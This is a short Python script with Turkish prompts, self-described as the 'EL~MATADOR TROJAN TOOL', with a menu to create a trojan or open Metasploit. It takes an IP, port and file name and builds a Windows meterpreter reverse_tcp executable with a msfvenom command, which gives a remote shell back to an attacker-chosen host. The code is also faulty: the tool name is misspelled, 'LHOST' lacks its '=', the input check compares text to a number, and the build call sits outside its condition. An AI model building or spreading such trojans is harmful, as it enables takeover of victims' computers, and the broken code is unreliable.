import os
os.system("clear")
banner="""
####################
EL~MATADOR
TROJAN TOOL
////CODER BY MATADOR\\\\
/herhangi bi hata durumunda bana instagramdan ulsabilirsiniz!
instagram: https://instagram.com/elmatadoroffical?igshid=wj0suow3vtg3 \
####################
"""
print(banner)
print("""
1) trojan olustur
2) metasploit aç""")
girdi=input("------>%")
if (girdi==1):
    ip=raw_input("ip adresi girin------>%")
    port=raw_input("port giriniz------>%")
    isim=raw_input("trojan ismi giriniz------")
    
os.system("clear && msvefon -p windows/meterpreter/reverse_tcp LHOST"+ip+ " LPORT="+port+" -f exe -o "+isim)
if (girdi==2):
	os.system("msfconsole")